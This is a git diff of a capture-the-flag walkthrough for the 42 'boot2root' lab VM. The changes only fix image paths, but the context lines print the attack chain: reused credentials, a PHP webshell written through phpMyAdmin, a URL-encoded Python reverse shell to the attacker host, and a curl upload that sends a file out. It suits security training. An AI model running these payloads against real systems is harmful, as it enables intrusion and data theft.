@@ -102,19 +102,19 @@ Permission denied, please try again.
 
 But it fails, let's try on the forum page. Success !
 
-![](/home/pyves/gitlab/42/42-boot2root/images/lmezard_logged.png)
+![](./images/lmezard_logged.png)
 
 On the profile page we can see a mail address *(laurie@borntosec.net). It might be interesting since we found a webmail.\
-![](/home/pyves/gitlab/42/42-boot2root/images/lmezard_profile.png)
+![](./images/lmezard_profile.png)
 
 Let's try on the webmail with the previous password. Success again !
-![](/home/pyves/gitlab/42/42-boot2root/images/lmezard_webmailpng.png)
+![](./images/lmezard_webmailpng.png)
 
 On the mail *DB ACCESS* we find credentials, **root/Fg-'kKXBj87E:aJ$** let's try it on the *phpmyadmin* page.\
-![](/home/pyves/gitlab/42/42-boot2root/images/lmezard_webmail_db_access.png)
+![](./images/lmezard_webmail_db_access.png)
 
 Bingo again ! We have total control on the database since we are *root*.
-![](/home/pyves/gitlab/42/42-boot2root/images/root_phpmyadmin.png)
+![](./images/root_phpmyadmin.png)
 
 Nothing interesting in the database, but we could try something else. Since we are root we can execute som sql queries,
 and if we are lucky we can upload a webshell on the server by executing `SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '<directory>';`
@@ -123,7 +123,7 @@ After trying a lot of path, there is only one path where we got permission to cr
 
 - `SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/forum/templates_c/webshell.php'`
 
-![](/home/pyves/gitlab/42/42-boot2root/images/root_pma_upload_webshell.png)
+![](./images/root_pma_upload_webshell.png)
 
 Ok, now we must test it.
 
@@ -153,7 +153,7 @@ And on the first terminal we execute the following command:
 - `curl -k -s "https://192.168.56.8/forum/templates_c/webshell.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%35%36%2e%35%22%2c%34%32%34%32%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27"`
 
 Which is a reverse shell encoded in url format with *burpsuite*.\
-![](/home/pyves/gitlab/42/42-boot2root/images/webshell_reverse_shell_payload.png)
+![](./images/webshell_reverse_shell_payload.png)
 
 We have a reverse shell ! Let's spawn a tty shell.
 
@@ -230,7 +230,7 @@ lmezard:G!@M6f4Eatau{sF"
 
 We may authenticate as **lmezard** with these credentials.
 
-![](/home/pyves/gitlab/42/42-boot2root/images/reverse_shell_auth_lmezard.png)
+![](./images/reverse_shell_auth_lmezard.png)
 
 Now we can inspect the **lmezard's** home directory.
 
@@ -258,12 +258,12 @@ In our machine:
 1. `pip3 install uploadserver`
 2. `python3 -m uploadserver`
 
-![](/home/pyves/gitlab/42/42-boot2root/images/uploadserver.png)
+![](./images/uploadserver.png)
 
 In the victim's machine:
 3. `curl -X POST 'http://192.168.56.5:8000/upload' -F 'files=@./fun'`
 
-![](/home/pyves/gitlab/42/42-boot2root/images/lmezard_upload_fun.png)
+![](./images/lmezard_upload_fun.png)
 
 
 Now let's extract the archive.
